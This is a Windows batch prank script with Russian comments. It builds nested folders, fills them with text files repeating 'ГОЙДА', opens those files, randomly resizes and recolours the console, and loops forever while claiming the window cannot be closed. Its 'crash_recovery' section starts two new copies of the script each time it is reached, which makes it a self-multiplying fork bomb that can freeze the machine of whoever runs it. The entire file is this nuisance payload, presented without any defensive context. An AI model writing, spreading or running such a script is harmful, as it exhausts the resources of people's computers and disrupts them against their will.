@echo off
chcp 1251 >nul
setlocal ENABLEEXTENSIONS
setlocal DISABLEDELAYEDEXPANSION

:: Устанавливаем метку для автоперезапуска
:restart

:: Проверяем, не был ли скрипт ранее перезапущен
if "%RESTARTED%"=="1" (
    echo Скрипт был перезапущен после прерывания.
) else (
    echo Запуск скрипта.
)

:: Устанавливаем флаг, чтобы пометить перезапуск
set RESTARTED=1

:: Основной код
set papka=4

:loop
if %papka% gtr 0 (
    mkdir %papka%
    cd %papka%

    :: Случайное количество слов ГОЙДА от 1 до 1000
    set /a numWords=%random% %% 1000 + 1
    setlocal enabledelayedexpansion
    set "text="
    for /l %%i in (1,1,!numWords!) do (
        set "text=!text!ГОЙДА "
    )
    echo !text! > Goida.txt
    
    :: Случайный размер окна
    set /a width=%random% %% 120 + 80
    set /a height=%random% %% 40 + 20
    mode con: cols=!width! lines=!height!
    
    :: Случайный цвет фона и текста (пара 0-15)
    set /a colorText=%random% %% 16
    set /a colorBack=%random% %% 16
    color !colorText!!colorBack!

    start "" /MIN Goida.txt
    call :createInnerFolders %papka%
    cd ..
    set /a papka=%papka%-1
    goto loop
)

:: Уведомление об окончании работы
echo Все папки созданы. Закрытие окна заблокировано.

:: Бесконечный цикл
:infinite
timeout /t 86400 >nul
goto infinite

:createInnerFolders
setlocal
set /a current=%~1

set /a nextFolder=%current%-1
if %nextFolder% gtr 0 (
    mkdir %nextFolder%
    cd %nextFolder%

    :: Случайное количество слов ГОЙДА от 1 до 1000
    set /a numWords=%random% %% 1000 + 1
    setlocal enabledelayedexpansion
    set "text="
    for /l %%i in (1,1,!numWords!) do (
        set "text=!text!ГОЙДА "
    )
    echo !text! > Goida.txt
    
    :: Случайный размер окна
    set /a width=%random% %% 120 + 80
    set /a height=%random% %% 40 + 20
    mode con: cols=!width! lines=!height!
    
    :: Случайный цвет фона и текста (пара 0-15)
    set /a colorText=%random% %% 16
    set /a colorBack=%random% %% 16
    color !colorText!!colorBack!

    start "" Goida.txt
    call :createInnerFolders %nextFolder%
    cd ..
)

endlocal

:: Проверка на закрытие и запуск двух новых окон при закрытии
:crash_recovery
start "" "%~f0" & start "" "%~f0" & exit /b
